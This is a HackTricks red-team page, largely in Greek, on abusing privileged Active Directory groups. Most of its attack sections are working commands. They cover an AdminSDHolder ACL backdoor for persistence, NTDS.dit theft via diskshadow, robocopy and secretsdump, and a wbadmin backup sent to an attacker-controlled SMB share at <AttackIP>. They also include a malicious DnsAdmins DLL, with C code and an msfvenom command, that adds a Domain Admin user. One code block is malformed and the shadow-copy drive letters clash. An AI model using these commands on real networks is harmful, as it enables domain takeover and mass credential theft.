# Privileged Groups

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

## Well Known groups with administration privileges

* **Διαχειριστές**
* **Διαχειριστές Τομέα**
* **Διαχειριστές Επιχείρησης**

## Account Operators

Αυτή η ομάδα έχει τη δυνατότητα να δημιουργεί λογαριασμούς και ομάδες που δεν είναι διαχειριστές στον τομέα. Επιπλέον, επιτρέπει την τοπική σύνδεση στον Ελεγκτή Τομέα (DC).

Για να προσδιοριστούν τα μέλη αυτής της ομάδας, εκτελείται η ακόλουθη εντολή:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Η προσθήκη νέων χρηστών επιτρέπεται, καθώς και η τοπική σύνδεση στο DC01.

## AdminSDHolder group

Η Λίστα Ελέγχου Πρόσβασης (ACL) της ομάδας **AdminSDHolder** είναι κρίσιμη καθώς καθορίζει τα δικαιώματα για όλες τις "προστατευμένες ομάδες" εντός του Active Directory, συμπεριλαμβανομένων των ομάδων υψηλών προνομίων. Αυτός ο μηχανισμός διασφαλίζει την ασφάλεια αυτών των ομάδων αποτρέποντας μη εξουσιοδοτημένες τροποποιήσεις.

Ένας επιτιθέμενος θα μπορούσε να εκμεταλλευτεί αυτό τροποποιώντας την ACL της ομάδας **AdminSDHolder**, παρέχοντας πλήρη δικαιώματα σε έναν τυπικό χρήστη. Αυτό θα έδινε ουσιαστικά σε αυτόν τον χρήστη πλήρη έλεγχο σε όλες τις προστατευμένες ομάδες. Εάν τα δικαιώματα αυτού του χρήστη τροποποιηθούν ή αφαιρεθούν, θα αποκατασταθούν αυτόματα εντός μιας ώρας λόγω του σχεδιασμού του συστήματος.

Οι εντολές για την ανασκόπηση των μελών και την τροποποίηση των δικαιωμάτων περιλαμβάνουν:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Ένα σενάριο είναι διαθέσιμο για να επιταχύνει τη διαδικασία αποκατάστασης: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Για περισσότερες λεπτομέρειες, επισκεφθείτε το [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Η συμμετοχή σε αυτή την ομάδα επιτρέπει την ανάγνωση διαγραμμένων αντικειμένων Active Directory, τα οποία μπορούν να αποκαλύψουν ευαίσθητες πληροφορίες:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Πρόσβαση στον Ελεγκτή Τομέα

Η πρόσβαση σε αρχεία στον DC είναι περιορισμένη εκτός αν ο χρήστης είναι μέλος της ομάδας `Server Operators`, η οποία αλλάζει το επίπεδο πρόσβασης.

### Κλιμάκωση Δικαιωμάτων

Χρησιμοποιώντας το `PsService` ή το `sc` από το Sysinternals, μπορεί κανείς να επιθεωρήσει και να τροποποιήσει τις άδειες υπηρεσιών. Η ομάδα `Server Operators`, για παράδειγμα, έχει πλήρη έλεγχο σε ορισμένες υπηρεσίες, επιτρέποντας την εκτέλεση αυθαίρετων εντολών και κλιμάκωση δικαιωμάτων:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Αυτή η εντολή αποκαλύπτει ότι οι `Server Operators` έχουν πλήρη πρόσβαση, επιτρέποντας τη χειραγώγηση υπηρεσιών για ανυψωμένα δικαιώματα.

## Backup Operators

Η συμμετοχή στην ομάδα `Backup Operators` παρέχει πρόσβαση στο σύστημα αρχείων `DC01` λόγω των δικαιωμάτων `SeBackup` και `SeRestore`. Αυτά τα δικαιώματα επιτρέπουν τη διαδρομή φακέλων, την καταγραφή και τις δυνατότητες αντιγραφής αρχείων, ακόμη και χωρίς ρητές άδειες, χρησιμοποιώντας τη σημαία `FILE_FLAG_BACKUP_SEMANTICS`. Η χρήση συγκεκριμένων σεναρίων είναι απαραίτητη για αυτή τη διαδικασία.

Για να καταγράψετε τα μέλη της ομάδας, εκτελέστε:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Τοπική Επίθεση

Για να εκμεταλλευτείτε αυτά τα προνόμια τοπικά, χρησιμοποιούνται τα εξής βήματα:

1. Εισαγωγή απαραίτητων βιβλιοθηκών:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Ενεργοποιήστε και επαληθεύστε το `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Πρόσβαση και αντιγραφή αρχείων από περιορισμένους καταλόγους, για παράδειγμα:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Άμεση πρόσβαση στο σύστημα αρχείων του Domain Controller επιτρέπει την κλοπή της βάσης δεδομένων `NTDS.dit`, η οποία περιέχει όλους τους NTLM hashes για τους χρήστες και τους υπολογιστές του τομέα.

#### Using diskshadow.exe

1. Δημιουργήστε μια σκιαγραφία του δίσκου `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Αντιγράψτε το `NTDS.dit` από την αντίγραφο σκιάς:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Εναλλακτικά, χρησιμοποιήστε `robocopy` για την αντιγραφή αρχείων:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Εξαγωγή `SYSTEM` και `SAM` για την ανάκτηση κατακερματισμού:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Ανάκτηση όλων των κατακερματισμών από το `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Χρησιμοποιώντας το wbadmin.exe

1. Ρυθμίστε το σύστημα αρχείων NTFS για τον διακομιστή SMB στη μηχανή του επιτιθέμενου και αποθηκεύστε τα διαπιστευτήρια SMB στη στοχοθετημένη μηχανή.
2. Χρησιμοποιήστε το `wbadmin.exe` για δημιουργία αντιγράφου ασφαλείας του συστήματος και εξαγωγή του `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Για μια πρακτική επίδειξη, δείτε το [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Τα μέλη της ομάδας **DnsAdmins** μπορούν να εκμεταλλευτούν τα προνόμιά τους για να φορτώσουν μια αυθαίρετη DLL με προνόμια SYSTEM σε έναν διακομιστή DNS, που συχνά φιλοξενείται σε Domain Controllers. Αυτή η ικανότητα επιτρέπει σημαντική δυνατότητα εκμετάλλευσης.

Για να καταγράψετε τα μέλη της ομάδας DnsAdmins, χρησιμοποιήστε:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Εκτέλεση αυθαίρετης DLL

Τα μέλη μπορούν να κάνουν τον διακομιστή DNS να φορτώσει μια αυθαίρετη DLL (είτε τοπικά είτε από μια απομακρυσμένη κοινή χρήση) χρησιμοποιώντας εντολές όπως:
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Είναι απαραίτητο να επανεκκινήσετε την υπηρεσία DNS (η οποία μπορεί να απαιτεί επιπλέον δικαιώματα) ώστε να φορτωθεί το DLL:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Για περισσότερες λεπτομέρειες σχετικά με αυτό το επιθετικό διανύσμα, ανατρέξτε στο ired.team.

#### Mimilib.dll
Είναι επίσης εφικτό να χρησιμοποιηθεί το mimilib.dll για εκτέλεση εντολών, τροποποιώντας το για να εκτελεί συγκεκριμένες εντολές ή αντίστροφες θήκες. [Δείτε αυτή την ανάρτηση](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) για περισσότερες πληροφορίες.

### WPAD Record για MitM
Οι DnsAdmins μπορούν να χειριστούν τα DNS records για να εκτελέσουν επιθέσεις Man-in-the-Middle (MitM) δημιουργώντας ένα WPAD record μετά την απενεργοποίηση της παγκόσμιας λίστας αποκλεισμού ερωτημάτων. Εργαλεία όπως το Responder ή το Inveigh μπορούν να χρησιμοποιηθούν για spoofing και καταγραφή δικτυακής κίνησης.

### Event Log Readers
Τα μέλη μπορούν να έχουν πρόσβαση στα αρχεία καταγραφής γεγονότων, ενδεχομένως βρίσκοντας ευαίσθητες πληροφορίες όπως κωδικούς πρόσβασης σε απλό κείμενο ή λεπτομέρειες εκτέλεσης εντολών:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions
Αυτή η ομάδα μπορεί να τροποποιήσει τα DACLs στο αντικείμενο τομέα, πιθανώς παρέχοντας δικαιώματα DCSync. Οι τεχνικές για την κλιμάκωση προνομίων που εκμεταλλεύονται αυτή την ομάδα περιγράφονται στο αποθετήριο Exchange-AD-Privesc στο GitHub.
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Administrators
Οι Διαχειριστές Hyper-V έχουν πλήρη πρόσβαση στο Hyper-V, η οποία μπορεί να εκμεταλλευτεί για να αποκτήσουν έλεγχο πάνω σε εικονικοποιημένους Ελεγκτές Τομέα. Αυτό περιλαμβάνει την κλωνοποίηση ζωντανών Ελεγκτών Τομέα και την εξαγωγή NTLM hashes από το αρχείο NTDS.dit.

### Exploitation Example
Η Υπηρεσία Συντήρησης Mozilla του Firefox μπορεί να εκμεταλλευτεί από τους Διαχειριστές Hyper-V για να εκτελέσουν εντολές ως SYSTEM. Αυτό περιλαμβάνει τη δημιουργία σκληρού συνδέσμου σε ένα προστατευμένο αρχείο SYSTEM και την αντικατάστασή του με ένα κακόβουλο εκτελέσιμο:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Note: Η εκμετάλλευση σκληρών συνδέσμων έχει μετριαστεί σε πρόσφατες ενημερώσεις των Windows.

## Οργάνωση Διαχείρισης

Σε περιβάλλοντα όπου έχει αναπτυχθεί το **Microsoft Exchange**, μια ειδική ομάδα γνωστή ως **Οργάνωση Διαχείρισης** κατέχει σημαντικές δυνατότητες. Αυτή η ομάδα έχει προνόμια να **έχει πρόσβαση στα γραμματοκιβώτια όλων των χρηστών του τομέα** και διατηρεί **πλήρη έλεγχο πάνω στην Οργανωτική Μονάδα 'Microsoft Exchange Security Groups'**. Αυτός ο έλεγχος περιλαμβάνει την ομάδα **`Exchange Windows Permissions`**, η οποία μπορεί να εκμεταλλευτεί για κλιμάκωση προνομίων.

### Εκμετάλλευση Προνομίων και Εντολές

#### Εκτυπωτές
Τα μέλη της ομάδας **Εκτυπωτές** έχουν προικιστεί με αρκετά προνόμια, συμπεριλαμβανομένου του **`SeLoadDriverPrivilege`**, το οποίο τους επιτρέπει να **συνδέονται τοπικά σε έναν Domain Controller**, να τον απενεργοποιούν και να διαχειρίζονται εκτυπωτές. Για να εκμεταλλευτούν αυτά τα προνόμια, ειδικά αν το **`SeLoadDriverPrivilege`** δεν είναι ορατό σε μη ανυψωμένο περιβάλλον, είναι απαραίτητο να παρακαμφθεί ο Έλεγχος Λογαριασμού Χρήστη (UAC).

Για να καταγραφούν τα μέλη αυτής της ομάδας, χρησιμοποιείται η ακόλουθη εντολή PowerShell:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Για πιο λεπτομερείς τεχνικές εκμετάλλευσης που σχετίζονται με **`SeLoadDriverPrivilege`**, θα πρέπει να συμβουλευτείτε συγκεκριμένους πόρους ασφαλείας.

#### Χρήστες Απομακρυσμένης Επιφάνειας Εργασίας
Τα μέλη αυτής της ομάδας έχουν πρόσβαση σε υπολογιστές μέσω του Πρωτοκόλλου Απομακρυσμένης Επιφάνειας Εργασίας (RDP). Για να καταμετρηθούν αυτά τα μέλη, είναι διαθέσιμες εντολές PowerShell:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Περισσότερες πληροφορίες σχετικά με την εκμετάλλευση του RDP μπορούν να βρεθούν σε ειδικούς πόρους pentesting.

#### Χρήστες Απομακρυσμένης Διαχείρισης
Τα μέλη μπορούν να έχουν πρόσβαση σε υπολογιστές μέσω **Windows Remote Management (WinRM)**. Η καταμέτρηση αυτών των μελών επιτυγχάνεται μέσω:
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Για τεχνικές εκμετάλλευσης που σχετίζονται με **WinRM**, θα πρέπει να συμβουλευτείτε συγκεκριμένη τεκμηρίωση.

#### Διαχειριστές Διακομιστών
Αυτή η ομάδα έχει δικαιώματα να εκτελεί διάφορες ρυθμίσεις στους Ελεγκτές Τομέα, συμπεριλαμβανομένων των δικαιωμάτων δημιουργίας αντιγράφων ασφαλείας και αποκατάστασης, αλλαγής της συστημικής ώρας και τερματισμού του συστήματος. Για να καταμετρήσετε τα μέλη, η εντολή που παρέχεται είναι:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Αναφορές <a href="#references" id="references"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Χρησιμοποιήστε [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) για να δημιουργήσετε και να **αυτοματοποιήσετε ροές εργασίας** με τη βοήθεια των **πιο προηγμένων** εργαλείων της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
